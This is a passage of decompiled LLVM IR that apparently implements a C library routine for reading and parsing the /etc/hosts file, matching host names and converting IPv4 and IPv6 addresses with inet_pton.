  store i32 %v1_80503fa, i32* %eax.global-to-local, align 4
  %v1_80503fd = add i32 %v0_80503fd, -32
  store i32 %v1_80503fd, i32* @ebp, align 4
  %v5_8050400 = inttoptr i32 %v1_80503fa to i8*
  %v12_8050404 = icmp eq i32 %arg4, 1
  br i1 %v12_8050404, label %dec_label_pc_8050526, label %dec_label_pc_805040f

dec_label_pc_805040f:                             ; preds = %dec_label_pc_80503fa
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8050416 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8050416, align 4
  %tmp150 = icmp ult i32 %v1_80503fd, 4
  br i1 %tmp150, label %dec_label_pc_8050695, label %dec_label_pc_8050422

dec_label_pc_8050422:                             ; preds = %dec_label_pc_805040f
  %v0_8050422 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050422 = add i32 %v0_8050422, -36
  store i32 %v1_8050422, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_8050422, 8
  br i1 %tmp151, label %dec_label_pc_8050695, label %dec_label_pc_805042e

dec_label_pc_805042e:                             ; preds = %dec_label_pc_8050422
  %v0_805042e = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_805042e, 16
  br i1 %tmp152, label %dec_label_pc_8050695, label %dec_label_pc_8050437

dec_label_pc_8050437:                             ; preds = %dec_label_pc_805042e
  %v1_8050437 = add i32 %v0_8050422, -48
  store i32 %v1_8050437, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_8050437, 8
  br i1 %tmp153, label %dec_label_pc_8050695, label %dec_label_pc_8050443

dec_label_pc_8050443:                             ; preds = %dec_label_pc_8050437
  %v0_8050443 = load i32, i32* @ebx, align 4
  %v1_8050443 = add i32 %v0_8050443, 48
  %v1_8050446 = add i32 %v0_8050422, -44
  store i32 %v1_8050446, i32* @ebp, align 4
  %v1_805044d = add i32 %v0_8050422, -56
  store i32 %v1_805044d, i32* @eax, align 4
  %v1_8050450 = add i32 %v0_8050443, 36
  store i32 %v1_8050450, i32* @edi, align 4
  %v7_8050453 = icmp ult i32 %v1_805044d, %v1_8050446
  br i1 %v7_8050453, label %dec_label_pc_805045c, label %dec_label_pc_8050457

dec_label_pc_8050457:                             ; preds = %dec_label_pc_8050443
  %v1_8050457 = add i32 %v0_8050443, 44
  store i32 %v1_8050457, i32* @esi, align 4
  br label %dec_label_pc_8050461

dec_label_pc_805045c:                             ; preds = %dec_label_pc_8050443
  %v1_805045c = add i32 %v0_8050443, 56
  store i32 %v1_805045c, i32* @esi, align 4
  store i32 %v1_805044d, i32* @ebp, align 4
  br label %dec_label_pc_8050461

dec_label_pc_8050461:                             ; preds = %dec_label_pc_8050457, %dec_label_pc_805045c
  %v0_8050461 = phi i32 [ %v1_8050446, %dec_label_pc_8050457 ], [ %v1_805044d, %dec_label_pc_805045c ]
  %tmp154 = icmp ult i32 %v0_8050461, 80
  br i1 %tmp154, label %dec_label_pc_8050695, label %dec_label_pc_805046a

dec_label_pc_805046a:                             ; preds = %dec_label_pc_8050461
  %v0_805046a = call i32 @__open_etc_hosts()
  store i32 %v0_805046a, i32* %eax.global-to-local, align 4
  %v1_8050473 = icmp eq i32 %v0_805046a, 0
  br i1 %v1_8050473, label %dec_label_pc_8050497, label %dec_label_pc_8050477

dec_label_pc_8050477:                             ; preds = %dec_label_pc_805046a
  store i32 %v1_80503fa, i32* %edx.global-to-local, align 4
  store i32 %v1_8050443, i32* %eax.global-to-local, align 4
  store i8* %v5_8050400, i8** %stack_var_-44, align 4
  %v0_8050482 = load i32, i32* @edi, align 4
  %v0_805048e = load i32, i32* @esi, align 4
  %v5_805048e = inttoptr i32 %v0_805048e to i8*
  br label %dec_label_pc_8050545

dec_label_pc_8050497:                             ; preds = %dec_label_pc_805046a
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805049b = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805049b, align 4
  %v1_80504a1 = call i32 @__errno_location(i32 0)
  store i32 %v1_80504a1, i32* %eax.global-to-local, align 4
  %v1_80504a6 = inttoptr i32 %v1_80504a1 to i32*
  %v2_80504a6 = load i32, i32* %v1_80504a6, align 4
  store i32 %v2_80504a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050695

dec_label_pc_80504b1:                             ; preds = %dec_label_pc_8050618
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_80504b5 = load i8*, i8** %stack_var_-44, align 4
  %v3_80504b5 = ptrtoint i8* %v2_80504b5 to i32
  %v2_80504b8 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_80504b5, i32* %v2_80504b8, align 4
  %v0_80504ba = load i32, i32* %eax.global-to-local, align 4
  %v1_80504ba = add i32 %v0_80504ba, 4
  %v2_80504ba = inttoptr i32 %v1_80504ba to i32*
  store i32 0, i32* %v2_80504ba, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_80504c5 = load i32, i32* @ebx, align 4
  %v1_80504c5 = add i32 %v0_80504c5, 4
  %v2_80504c5 = inttoptr i32 %v1_80504c5 to i32*
  %v3_80504c5 = load i32, i32* %v2_80504c5, align 4
  store i32 %v3_80504c5, i32* %eax.global-to-local, align 4
  store i32 %v3_80504c5, i32* %arg5, align 4
  %v0_80504ca = load i32, i32* %edx.global-to-local, align 4
  %v1_80504ca = add i32 %v0_80504ca, 8
  %v2_80504ca = inttoptr i32 %v1_80504ca to i32*
  store i32 2, i32* %v2_80504ca, align 4
  %v0_80504d1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80504d1 = add i32 %v0_80504d1, 12
  %v2_80504d1 = inttoptr i32 %v1_80504d1 to i32*
  store i32 4, i32* %v2_80504d1, align 4
  br label %dec_label_pc_805050a

dec_label_pc_80504de:                             ; preds = %dec_label_pc_805063a
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_80504e6 = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_80504e6, align 4
  %v0_80504e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80504e8 = add i32 %v0_80504e8, 4
  %v2_80504e8 = inttoptr i32 %v1_80504e8 to i32*
  store i32 0, i32* %v2_80504e8, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_80504f3 = load i32, i32* @ebx, align 4
  %v1_80504f3 = add i32 %v0_80504f3, 4
  %v2_80504f3 = inttoptr i32 %v1_80504f3 to i32*
  %v3_80504f3 = load i32, i32* %v2_80504f3, align 4
  store i32 %v3_80504f3, i32* %eax.global-to-local, align 4
  store i32 %v3_80504f3, i32* %arg5, align 4
  %v0_80504f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80504f8 = add i32 %v0_80504f8, 8
  %v2_80504f8 = inttoptr i32 %v1_80504f8 to i32*
  store i32 10, i32* %v2_80504f8, align 4
  %v0_80504ff = load i32, i32* %edx.global-to-local, align 4
  %v1_80504ff = add i32 %v0_80504ff, 12
  %v2_80504ff = inttoptr i32 %v1_80504ff to i32*
  store i32 16, i32* %v2_80504ff, align 4
  br label %dec_label_pc_805050a

dec_label_pc_805050a:                             ; preds = %dec_label_pc_80504b1, %dec_label_pc_80504de
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_80504b1 ], [ %stack_var_-32.0, %dec_label_pc_80504de ]
  %v1_805050a = load i32, i32* %edx.global-to-local, align 4
  %v2_805050a = add i32 %v1_805050a, 16
  %v3_805050a = inttoptr i32 %v2_805050a to i32*
  store i32 %storemerge, i32* %v3_805050a, align 4
  %v0_805050d = load i32, i32* @ebx, align 4
  %v1_805050d = add i32 %v0_805050d, 8
  %v1_8050510 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050510 = add i32 %v1_8050510, 4
  %v3_8050510 = inttoptr i32 %v2_8050510 to i32*
  store i32 %v1_805050d, i32* %v3_8050510, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8050517 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050517 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8050517, i32* %v2_8050517, align 4
  br label %dec_label_pc_8050675

dec_label_pc_8050526:                             ; preds = %dec_label_pc_80503fa
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8050545

dec_label_pc_8050545:                             ; preds = %dec_label_pc_8050477, %dec_label_pc_8050526
  %v1_8050549.pre-phi = phi i32* [ %v1_8050416, %dec_label_pc_8050477 ], [ %.pre, %dec_label_pc_8050526 ]
  %stack_var_-32.0 = phi i32 [ %v1_8050443, %dec_label_pc_8050477 ], [ 0, %dec_label_pc_8050526 ]
  %stack_var_-36.0 = phi i32 [ %v1_80503fa, %dec_label_pc_8050477 ], [ 0, %dec_label_pc_8050526 ]
  %stack_var_-40.0 = phi i32 [ %v0_8050482, %dec_label_pc_8050477 ], [ 0, %dec_label_pc_8050526 ]
  %stack_var_4.0 = phi i32 [ %v0_805046a, %dec_label_pc_8050477 ], [ %arg1, %dec_label_pc_8050526 ]
  %stack_var_-20.0 = phi i8* [ %v5_805048e, %dec_label_pc_8050477 ], [ %v5_8050400, %dec_label_pc_8050526 ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8050549.pre-phi, align 4
  %v4_8050661 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_80505fe = inttoptr i32 %arg2 to i8*
  %v0_805065b120127 = load i32, i32* @edx, align 4
  %v3_8050665121128 = call i32 @fgets(i32 %v4_8050661, i32 %stack_var_4.0, i32 %v0_805065b120127)
  store i32 %v3_8050665121128, i32* @eax, align 4
  %v1_805066d122129 = icmp eq i32 %v3_8050665121128, 0
  %v1_805066f123130 = icmp eq i1 %v1_805066d122129, false
  br i1 %v1_805066f123130, label %dec_label_pc_805055c.lr.ph.lr.ph, label %dec_label_pc_8050675

dec_label_pc_805055c.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8050545
  %v12_8050633 = icmp eq i32 %arg3, 10
  %v12_8050611 = icmp eq i32 %arg3, 2
  %v12_80505d8 = icmp eq i32 %arg4, 2
  %v1_80505dd = icmp eq i1 %v12_80505d8, false
  %v1_8050616 = icmp eq i1 %v12_8050611, false
  %v1_8050638 = icmp eq i1 %v12_8050633, false
  br label %dec_label_pc_805055c.lr.ph

dec_label_pc_805055c.lr.ph:                       ; preds = %dec_label_pc_805055c.lr.ph.lr.ph, %dec_label_pc_805065b.outer.backedge
  %v3_8050665121132 = phi i32 [ %v3_8050665121128, %dec_label_pc_805055c.lr.ph.lr.ph ], [ %v3_8050665121, %dec_label_pc_805065b.outer.backedge ]
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_805055c.lr.ph.lr.ph ], [ 2, %dec_label_pc_805065b.outer.backedge ]
  br label %dec_label_pc_805055c

dec_label_pc_805055c:                             ; preds = %dec_label_pc_805055c.lr.ph, %dec_label_pc_805065b.backedge
  %v3_8050665124 = phi i32 [ %v3_8050665121132, %dec_label_pc_805055c.lr.ph ], [ %v3_8050665, %dec_label_pc_805065b.backedge ]
  %v5_8050564 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35, i32 %v3_8050665124, i32 %v3_8050665124)
  store i32 %v5_8050564, i32* @eax, align 4
  %v1_805056c = icmp eq i32 %v5_8050564, 0
  br i1 %v1_805056c, label %dec_label_pc_8050573, label %dec_label_pc_8050570

dec_label_pc_8050570:                             ; preds = %dec_label_pc_805055c
  %v1_8050570 = inttoptr i32 %v5_8050564 to i8*
  store i8 0, i8* %v1_8050570, align 1
  br label %dec_label_pc_8050573

dec_label_pc_8050573:                             ; preds = %dec_label_pc_805055c, %dec_label_pc_8050570
  store i32 %v4_8050661, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80505b332 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80505b333 = icmp eq i8 %v2_80505b332, 0
  %v1_80505b639 = icmp eq i1 %v3_80505b333, false
  br i1 %v1_80505b639, label %dec_label_pc_805057f.preheader.preheader, label %dec_label_pc_80505b8

dec_label_pc_805057f.preheader.preheader:         ; preds = %dec_label_pc_8050573
  %v4_805057f97.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805057f.preheader

dec_label_pc_805057b:                             ; preds = %dec_label_pc_8050585
  store i8 0, i8* %v1_805057f102, align 1
  %v0_805057e = load i32, i32* @ecx, align 4
  %v1_805057e = add i32 %v0_805057e, 1
  store i32 %v1_805057e, i32* @ecx, align 4
  %v1_805057f = inttoptr i32 %v1_805057e to i8*
  %v2_805057f = load i8, i8* %v1_805057f, align 1
  %v3_805057f = zext i8 %v2_805057f to i32
  %v4_805057f = load i32, i32* %eax.global-to-local, align 4
  %v5_805057f = and i32 %v4_805057f, -256
  %v6_805057f = or i32 %v5_805057f, %v3_805057f
  store i32 %v6_805057f, i32* @eax, align 4
  %v4_8050581 = icmp eq i8 %v2_805057f, 0
  br i1 %v4_8050581, label %dec_label_pc_805057f.dec_label_pc_80505b8.loopexit_crit_edge, label %dec_label_pc_8050585

dec_label_pc_8050585:                             ; preds = %dec_label_pc_805057f.preheader, %dec_label_pc_805057b
  %v2_805057f103 = phi i8 [ %v2_805057f, %dec_label_pc_805057b ], [ %v2_805057f95, %dec_label_pc_805057f.preheader ]
  %v1_805057f102 = phi i8* [ %v1_805057f, %dec_label_pc_805057b ], [ %v1_805057f94, %dec_label_pc_805057f.preheader ]
  %v0_805057b101 = phi i32 [ %v1_805057e, %dec_label_pc_805057b ], [ %v0_805057f47, %dec_label_pc_805057f.preheader ]
  %v2_8050585 = sext i8 %v2_805057f103 to i32
  store i32 %v2_8050585, i32* @edx, align 4
  %v0_8050588 = load i32, i32* @global_var_8054320, align 32
  store i32 %v0_8050588, i32* %eax.global-to-local, align 4
  %v2_805058d = mul nsw i32 %v2_8050585, 2
  %v3_805058d = add i32 %v0_8050588, %v2_805058d
  %v4_805058d = inttoptr i32 %v3_805058d to i8*
  %v5_805058d = load i8, i8* %v4_805058d, align 1
  %v6_805058d = and i8 %v5_805058d, 32
  %v7_805058d = icmp eq i8 %v6_805058d, 0
  %v1_8050591 = icmp eq i1 %v7_805058d, false
  br i1 %v1_8050591, label %dec_label_pc_805057b, label %dec_label_pc_8050593

dec_label_pc_8050593:                             ; preds = %dec_label_pc_8050585
  %v0_8050593 = load i32, i32* @edi, align 4
  %v1_8050593 = add i32 %v0_8050593, -6
  %v6_8050593 = sub i32 5, %v0_8050593
  %v7_8050593 = and i32 %v6_8050593, %v0_8050593
  %v8_8050593 = icmp slt i32 %v7_8050593, 0
  %v9_8050593 = icmp eq i32 %v1_8050593, 0
  %v10_8050593 = icmp slt i32 %v1_8050593, 0
  %v3_8050596 = icmp eq i1 %v10_8050593, %v8_8050593
  %v4_8050596 = icmp eq i1 %v9_8050593, false
  %v5_8050596 = and i1 %v4_8050596, %v3_8050596
  br i1 %v5_8050596, label %dec_label_pc_805059f.preheader, label %dec_label_pc_8050598

dec_label_pc_8050598:                             ; preds = %dec_label_pc_8050593
  %v1_8050598 = load i32, i32* @ebx, align 4
  %v3_8050598 = mul i32 %v0_8050593, 4
  %v4_8050598 = add i32 %v1_8050598, %v3_8050598
  %v5_8050598 = inttoptr i32 %v4_8050598 to i32*
  store i32 %v0_805057b101, i32* %v5_8050598, align 4
  %v0_805059b = load i32, i32* @edi, align 4
  %v1_805059b = add i32 %v0_805059b, 1
  store i32 %v1_805059b, i32* @edi, align 4
  %v0_805059f.pre.pre = load i32, i32* @ecx, align 4
  %v4_805059f.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805059f.preheader

dec_label_pc_805059f.preheader:                   ; preds = %dec_label_pc_8050598, %dec_label_pc_8050593
  %v4_805059f.pre = phi i32 [ %v4_805059f.pre.pre, %dec_label_pc_8050598 ], [ %v0_8050588, %dec_label_pc_8050593 ]
  %v0_805059f.pre = phi i32 [ %v0_805059f.pre.pre, %dec_label_pc_8050598 ], [ %v0_805057b101, %dec_label_pc_8050593 ]
  %v1_80505b852 = phi i32 [ %v1_805059b, %dec_label_pc_8050598 ], [ %v0_8050593, %dec_label_pc_8050593 ]
  %v1_805059f104 = inttoptr i32 %v0_805059f.pre to i8*
  %v2_805059f105 = load i8, i8* %v1_805059f104, align 1
  %v3_805059f106 = zext i8 %v2_805059f105 to i32
  %v5_805059f107 = and i32 %v4_805059f.pre, -256
  %v6_805059f108 = or i32 %v3_805059f106, %v5_805059f107
  store i32 %v6_805059f108, i32* @eax, align 4
  %v4_80505a1109 = icmp eq i8 %v2_805059f105, 0
  br i1 %v4_80505a1109, label %dec_label_pc_80505b3.loopexit, label %dec_label_pc_80505a5.lr.ph

dec_label_pc_80505a5.lr.ph:                       ; preds = %dec_label_pc_805059f.preheader
  %v0_80505a8.pre = load i32, i32* @global_var_8054320, align 32
  br label %dec_label_pc_80505a5

dec_label_pc_805059e:                             ; preds = %dec_label_pc_80505a5
  %v1_805059e = add i32 %v0_80505b3110, 1
  store i32 %v1_805059e, i32* @ecx, align 4
  %v1_805059f = inttoptr i32 %v1_805059e to i8*
  %v2_805059f = load i8, i8* %v1_805059f, align 1
  %v3_805059f = zext i8 %v2_805059f to i32
  %v5_805059f = and i32 %v0_80505a8.pre, -256
  %v6_805059f = or i32 %v3_805059f, %v5_805059f
  store i32 %v6_805059f, i32* @eax, align 4
  %v4_80505a1 = icmp eq i8 %v2_805059f, 0
  br i1 %v4_80505a1, label %dec_label_pc_80505b3.loopexit, label %dec_label_pc_80505a5

dec_label_pc_80505a5:                             ; preds = %dec_label_pc_80505a5.lr.ph, %dec_label_pc_805059e
  %v2_805059f112 = phi i8 [ %v2_805059f105, %dec_label_pc_80505a5.lr.ph ], [ %v2_805059f, %dec_label_pc_805059e ]
  %v1_805059f111 = phi i8* [ %v1_805059f104, %dec_label_pc_80505a5.lr.ph ], [ %v1_805059f, %dec_label_pc_805059e ]
  %v0_80505b3110 = phi i32 [ %v0_805059f.pre, %dec_label_pc_80505a5.lr.ph ], [ %v1_805059e, %dec_label_pc_805059e ]
  %v2_80505a5 = sext i8 %v2_805059f112 to i32
  store i32 %v2_80505a5, i32* @edx, align 4
  store i32 %v0_80505a8.pre, i32* @eax, align 4
  %v2_80505ad = mul nsw i32 %v2_80505a5, 2
  %v3_80505ad = add i32 %v0_80505a8.pre, %v2_80505ad
  %v4_80505ad = inttoptr i32 %v3_80505ad to i8*
  %v5_80505ad = load i8, i8* %v4_80505ad, align 1
  %v6_80505ad = and i8 %v5_80505ad, 32
  %v7_80505ad = icmp eq i8 %v6_80505ad, 0
  br i1 %v7_80505ad, label %dec_label_pc_805059e, label %dec_label_pc_80505b3.loopexit

dec_label_pc_80505b3.loopexit:                    ; preds = %dec_label_pc_80505a5, %dec_label_pc_805059e, %dec_label_pc_805059f.preheader
  %v4_805057f97144 = phi i32 [ %v6_805059f108, %dec_label_pc_805059f.preheader ], [ %v6_805059f, %dec_label_pc_805059e ], [ %v0_80505a8.pre, %dec_label_pc_80505a5 ]
  %v0_80505b3.lcssa = phi i32 [ %v0_805059f.pre, %dec_label_pc_805059f.preheader ], [ %v1_805059e, %dec_label_pc_805059e ], [ %v0_80505b3110, %dec_label_pc_80505a5 ]
  %v1_805059f.lcssa = phi i8* [ %v1_805059f104, %dec_label_pc_805059f.preheader ], [ %v1_805059f, %dec_label_pc_805059e ], [ %v1_805059f111, %dec_label_pc_80505a5 ]
  %v2_80505b3 = load i8, i8* %v1_805059f.lcssa, align 1
  %v3_80505b3 = icmp eq i8 %v2_80505b3, 0
  %v1_80505b6 = icmp eq i1 %v3_80505b3, false
  br i1 %v1_80505b6, label %dec_label_pc_805057f.preheader, label %dec_label_pc_80505b8

dec_label_pc_805057f.preheader:                   ; preds = %dec_label_pc_805057f.preheader.preheader, %dec_label_pc_80505b3.loopexit
  %v1_80505b8.pre147 = phi i32 [ %v1_80505b852, %dec_label_pc_80505b3.loopexit ], [ 0, %dec_label_pc_805057f.preheader.preheader ]
  %v4_805057f97 = phi i32 [ %v4_805057f97144, %dec_label_pc_80505b3.loopexit ], [ %v4_805057f97.pre, %dec_label_pc_805057f.preheader.preheader ]
  %v0_805057f47 = phi i32 [ %v0_80505b3.lcssa, %dec_label_pc_80505b3.loopexit ], [ %v4_8050661, %dec_label_pc_805057f.preheader.preheader ]
  %v1_805057f94 = inttoptr i32 %v0_805057f47 to i8*
  %v2_805057f95 = load i8, i8* %v1_805057f94, align 1
  %v3_805057f96 = zext i8 %v2_805057f95 to i32
  %v5_805057f98 = and i32 %v4_805057f97, -256
  %v6_805057f99 = or i32 %v5_805057f98, %v3_805057f96
  store i32 %v6_805057f99, i32* @eax, align 4
  %v4_8050581100 = icmp eq i8 %v2_805057f95, 0
  br i1 %v4_8050581100, label %dec_label_pc_80505b8, label %dec_label_pc_8050585

dec_label_pc_805057f.dec_label_pc_80505b8.loopexit_crit_edge: ; preds = %dec_label_pc_805057b
  %v1_80505b8.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80505b8

dec_label_pc_80505b8:                             ; preds = %dec_label_pc_80505b3.loopexit, %dec_label_pc_805057f.dec_label_pc_80505b8.loopexit_crit_edge, %dec_label_pc_805057f.preheader, %dec_label_pc_8050573
  %v1_80505b8 = phi i32 [ 0, %dec_label_pc_8050573 ], [ %v1_80505b8.pre.pre, %dec_label_pc_805057f.dec_label_pc_80505b8.loopexit_crit_edge ], [ %v1_80505b8.pre147, %dec_label_pc_805057f.preheader ], [ %v1_80505b852, %dec_label_pc_80505b3.loopexit ]
  %v0_80505b8 = load i32, i32* @ebx, align 4
  %v2_80505b8 = mul i32 %v1_80505b8, 4
  %v3_80505b8 = add i32 %v2_80505b8, %v0_80505b8
  %v4_80505b8 = inttoptr i32 %v3_80505b8 to i32*
  store i32 0, i32* %v4_80505b8, align 4
  %v0_80505bf = load i32, i32* @edi, align 4
  %v7_80505c2 = icmp sgt i32 %v0_80505bf, 1
  br i1 %v7_80505c2, label %dec_label_pc_80505c8, label %dec_label_pc_805065b.backedge

dec_label_pc_80505c8:                             ; preds = %dec_label_pc_80505b8
  br i1 %v12_8050404, label %dec_label_pc_8050695, label %dec_label_pc_80505d3

dec_label_pc_80505d3:                             ; preds = %dec_label_pc_80505c8
  store i32 1, i32* @esi, align 4
  br i1 %v1_80505dd, label %dec_label_pc_80505f5.lr.ph, label %dec_label_pc_80505df

dec_label_pc_80505f5.lr.ph:                       ; preds = %dec_label_pc_80505d3
  br label %dec_label_pc_80505f5

dec_label_pc_80505df:                             ; preds = %dec_label_pc_80505d3
  %v0_80505df = load i32, i32* @eax, align 4
  %v0_80505e1 = load i32, i32* @ebx, align 4
  %v1_80505e1 = inttoptr i32 %v0_80505e1 to i32*
  %v2_80505e1 = load i32, i32* %v1_80505e1, align 4
  %v5_80505e7 = call i32 @__GI_strcoll(i8* %v2_80505fe, i32 %v2_80505e1, i32 %v0_80505df, i32 %v0_80505df)
  store i32 %v5_80505e7, i32* %eax.global-to-local, align 4
  %v1_80505ef = icmp eq i32 %v5_80505e7, 0
  %v1_80505f1 = icmp eq i1 %v1_80505ef, false
  br i1 %v1_80505f1, label %dec_label_pc_805065b.backedge, label %dec_label_pc_8050611

dec_label_pc_805065b.backedge:                    ; preds = %dec_label_pc_805060a, %dec_label_pc_80505df, %dec_label_pc_80505b8
  %v0_805065b = load i32, i32* @edx, align 4
  %v3_8050665 = call i32 @fgets(i32 %v4_8050661, i32 %stack_var_4.0, i32 %v0_805065b)
  store i32 %v3_8050665, i32* @eax, align 4
  %v1_805066d = icmp eq i32 %v3_8050665, 0
  %v1_805066f = icmp eq i1 %v1_805066d, false
  br i1 %v1_805066f, label %dec_label_pc_805055c, label %dec_label_pc_8050675

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80505f5.lr.ph, %dec_label_pc_805060a
  %v1_80505f7119 = phi i32 [ 1, %dec_label_pc_80505f5.lr.ph ], [ %v1_805060a, %dec_label_pc_805060a ]
  %v0_80505f7 = load i32, i32* @ebx, align 4
  %v2_80505f7 = mul i32 %v1_80505f7119, 4
  %v3_80505f7 = add i32 %v0_80505f7, %v2_80505f7
  %v4_80505f7 = inttoptr i32 %v3_80505f7 to i32*
  %v5_80505f7 = load i32, i32* %v4_80505f7, align 4
  %v3_80505fe = call i32 @__GI_strcasecmp(i8* %v2_80505fe, i32 %v5_80505f7)
  store i32 %v3_80505fe, i32* %eax.global-to-local, align 4
  %v1_8050606 = icmp eq i32 %v3_80505fe, 0
  br i1 %v1_8050606, label %dec_label_pc_8050611, label %dec_label_pc_805060a

dec_label_pc_805060a:                             ; preds = %dec_label_pc_80505f5
  %v0_805060a = load i32, i32* @esi, align 4
  %v1_805060a = add i32 %v0_805060a, 1
  store i32 %v1_805060a, i32* @esi, align 4
  %v1_805060b.pre = load i32, i32* @edi, align 4
  %v5_805060d = icmp slt i32 %v1_805060a, %v1_805060b.pre
  br i1 %v5_805060d, label %dec_label_pc_80505f5, label %dec_label_pc_805065b.backedge

dec_label_pc_8050611:                             ; preds = %dec_label_pc_80505df, %dec_label_pc_80505f5
  br i1 %v1_8050616, label %dec_label_pc_8050633, label %dec_label_pc_8050618

dec_label_pc_8050618:                             ; preds = %dec_label_pc_8050611
  %v0_8050618 = load i32, i32* @esi, align 4
  %v3_8050619 = load i8*, i8** %stack_var_-44, align 4
  %v4_8050619 = ptrtoint i8* %v3_8050619 to i32
  %v0_805061d = load i32, i32* @ebx, align 4
  %v1_805061d = inttoptr i32 %v0_805061d to i32*
  %v2_805061d = load i32, i32* %v1_805061d, align 4
  %v4_8050621 = inttoptr i32 %v2_805061d to i8*
  %v5_8050621 = call i32 @inet_pton(i32 2, i8* %v4_8050621, i32 %v4_8050619, i32 %v0_8050618)
  store i32 %v5_8050621, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8050621, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_80504b1, label %dec_label_pc_805065b.outer.backedge

dec_label_pc_805065b.outer.backedge:              ; preds = %dec_label_pc_8050618, %dec_label_pc_805063a, %dec_label_pc_8050633
  %v0_805065b120 = load i32, i32* @edx, align 4
  %v3_8050665121 = call i32 @fgets(i32 %v4_8050661, i32 %stack_var_4.0, i32 %v0_805065b120)
  store i32 %v3_8050665121, i32* @eax, align 4
  %v1_805066d122 = icmp eq i32 %v3_8050665121, 0
  %v1_805066f123 = icmp eq i1 %v1_805066d122, false
  br i1 %v1_805066f123, label %dec_label_pc_805055c.lr.ph, label %dec_label_pc_8050675

dec_label_pc_8050633:                             ; preds = %dec_label_pc_8050611
  br i1 %v1_8050638, label %dec_label_pc_805065b.outer.backedge, label %dec_label_pc_805063a

dec_label_pc_805063a:                             ; preds = %dec_label_pc_8050633
  %v0_805063a = load i32, i32* @ecx, align 4
  %v0_805063f = load i32, i32* @ebx, align 4
  %v1_805063f = inttoptr i32 %v0_805063f to i32*
  %v2_805063f = load i32, i32* %v1_805063f, align 4
  %v4_8050643 = inttoptr i32 %v2_805063f to i8*
  %v5_8050643 = call i32 @inet_pton(i32 10, i8* %v4_8050643, i32 %stack_var_-36.0, i32 %v0_805063a)
  store i32 %v5_8050643, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_8050643, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_80504de, label %dec_label_pc_805065b.outer.backedge

dec_label_pc_8050675:                             ; preds = %dec_label_pc_805065b.outer.backedge, %dec_label_pc_8050545, %dec_label_pc_805065b.backedge, %dec_label_pc_805050a
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805050a ], [ 1, %dec_label_pc_8050545 ], [ 2, %dec_label_pc_805065b.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_805065b.backedge ]
  br i1 %v12_8050404, label %dec_label_pc_8050695, label %dec_label_pc_805067c

dec_label_pc_805067c:                             ; preds = %dec_label_pc_8050675
  %v1_8050683 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8050683 = call i32 @__GI_fclose(i16* %v1_8050683)
  store i32 %v2_8050683, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050695

dec_label_pc_8050695:                             ; preds = %dec_label_pc_80505c8, %dec_label_pc_8050437, %dec_label_pc_8050461, %dec_label_pc_80503e5, %dec_label_pc_80503f1, %dec_label_pc_805040f, %dec_label_pc_8050422, %dec_label_pc_805042e, %dec_label_pc_8050675, %dec_label_pc_805067c, %dec_label_pc_8050497
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8050675 ], [ %stack_var_-28.1, %dec_label_pc_805067c ], [ %v2_80504a6, %dec_label_pc_8050497 ], [ 34, %dec_label_pc_805042e ], [ 34, %dec_label_pc_8050422 ], [ 34, %dec_label_pc_805040f ], [ 34, %dec_label_pc_80503f1 ], [ 34, %dec_label_pc_80503e5 ], [ 34, %dec_label_pc_8050461 ], [ 34, %dec_label_pc_8050437 ], [ %stack_var_-28.0.ph131, %dec_label_pc_80505c8 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80503d0, i32* @ebx, align 4
  store i32 %v0_80503cf, i32* @esi, align 4
  store i32 %v0_80503ce, i32* @edi, align 4
  store i32 %v0_80503cd, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_8050665121, { 1, 2, 0 }
  uselistorder i32 %v1_805060a, { 0, 2, 1 }
